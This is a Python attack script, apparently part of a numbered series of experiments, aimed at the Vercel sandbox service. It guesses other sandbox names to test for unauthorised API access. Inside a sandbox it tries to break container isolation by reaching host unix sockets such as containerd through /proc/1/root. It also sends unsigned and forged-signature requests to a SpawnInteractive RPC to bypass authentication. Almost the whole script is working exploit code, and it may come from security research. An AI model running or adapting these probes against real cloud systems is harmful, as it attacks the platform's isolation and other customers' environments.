# 实验J100: /proc/1/root 穿透访问宿主 unix sockets (cell/containerd) + API 越权带 projectId + curl 测 SpawnInteractive
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

# --- [A] API 越权: 陌生沙箱名 + 有效 projectId ---
print("== [A] GET /v2/sandboxes/{name}?teamId&projectId (陌生名字) ==", flush=True)
for name in ["test", "test1", "abc", "sandbox", "default", "my-sandbox", "expj65", "expj79a"]:
    c, r = api("GET", f"/v2/sandboxes/{name}?teamId={TEAM}&projectId={PROJ}")
    print(f"  [{name}] {c}: {r[:250]}", flush=True)
    time.sleep(0.3)

print("== [A2] GET /v2/sandboxes 枚举 (自己 project 全部) ==", flush=True)
c, r = api("GET", f"/v2/sandboxes?teamId={TEAM}&projectId={PROJ}")
print(f"  {c}: {r[:600]}", flush=True)

# --- [B] 沙箱内: /proc/1/root 穿透访问宿主 unix socket ---
NAME = "expj100"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("\ncreate:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, socket, subprocess, base64, time

print("== [B1] 宿主 socket 文件经 /proc/1/root 可见性 ==", flush=True)
for p in ["/proc/1/root/run/cell/cell.sock",
          "/proc/1/root/run/containerd/containerd.sock",
          "/proc/1/root/run/metrics/metrics.sock",
          "/proc/1/root/run/apm/apm.sock"]:
    try:
        st = os.stat(p)
        print(f"  {p} EXISTS mode={oct(st.st_mode)}", flush=True)
    except Exception as e:
        print(f"  {p} MISS ({e})", flush=True)

print("== [B2] connect 测试: /proc/1/root/run/cell/cell.sock ==", flush=True)
for sock_path in ["/proc/1/root/run/cell/cell.sock",
                  "/proc/1/root/run/containerd/containerd.sock",
                  "/proc/1/root/run/metrics/metrics.sock",
                  "/proc/1/root/run/apm/apm.sock"]:
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect(sock_path)
        print(f"  CONNECT OK: {sock_path}", flush=True)
        s.close()
    except Exception as e:
        print(f"  CONNECT FAIL: {sock_path} ({e})", flush=True)

print("== [B3] curl --unix-socket /proc/1/root/run/cell/cell.sock 探测 ==", flush=True)
for args in [["curl", "-sS", "-m", "5", "-i", "--unix-socket", "/proc/1/root/run/cell/cell.sock", "http://localhost/"],
             ["curl", "-sS", "-m", "5", "-i", "--unix-socket", "/proc/1/root/run/cell/cell.sock", "http://localhost/ping"],
             ["curl", "-sS", "-m", "5", "-i", "--unix-socket", "/proc/1/root/run/cell/cell.sock", "http://localhost/v1/version"],
             ["curl", "-sS", "-m", "5", "-i", "--unix-socket", "/proc/1/root/run/containerd/containerd.sock", "http://localhost/v1/version"]]:
    try:
        r = subprocess.run(args, capture_output=True, timeout=8)
        out = (r.stdout + r.stderr).decode(errors="replace")
        print(f"  {' '.join(args[4:])} -> {out[:300]}", flush=True)
    except Exception as e:
        print(f"  EXC: {e}", flush=True)

print("== [B4] curl 测 SpawnInteractive (无签名/假签名, 与 j99 raw socket 对比) ==", flush=True)
TS = str(int(time.time() * 1000))
SIG = base64.b64encode(b"\x99" * 64).decode()
for sig_hdr in [[], ["-H", "x-signature: " + SIG]]:
    cmd = ["curl", "-sS", "-m", "6", "-i", "-X", "POST",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "Content-Type: application/connect+json",
           "-H", "Connect-Protocol-Version: 1",
           "-H", "x-timestamp: " + TS] + sig_hdr + [
           "--data-binary", "@-",
           "http://localhost/vercel.sandbox.spawn.v1.SpawnService/SpawnInteractive"]
    try:
        r = subprocess.run(cmd, input=b"{}", capture_output=True, timeout=10)
        out = (r.stdout + r.stderr).decode(errors="replace")
        print(f"  sig={'Y' if sig_hdr else 'N'} -> {out[:400]}", flush=True)
    except Exception as e:
        print(f"  EXC: {e}", flush=True)

print("== [B5] Ping 对照 (应免签) ==", flush=True)
cmd = ["curl", "-sS", "-m", "6", "-i", "-X", "POST",
       "--unix-socket", "/run/vercel/share/init.sock",
       "-H", "Content-Type: application/connect+json",
       "-H", "Connect-Protocol-Version: 1",
       "-H", "x-timestamp: " + TS,
       "--data-binary", "@-",
       "http://localhost/vercel.sandbox.spawn.v1.SpawnService/Ping"]
try:
    r = subprocess.run(cmd, input=b"{}", capture_output=True, timeout=10)
    print((r.stdout + r.stderr).decode(errors="replace")[:400], flush=True)
except Exception as e:
    print("EXC", e, flush=True)
"""
run_cmd(sid, PROBE, "host-socket-pierce", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
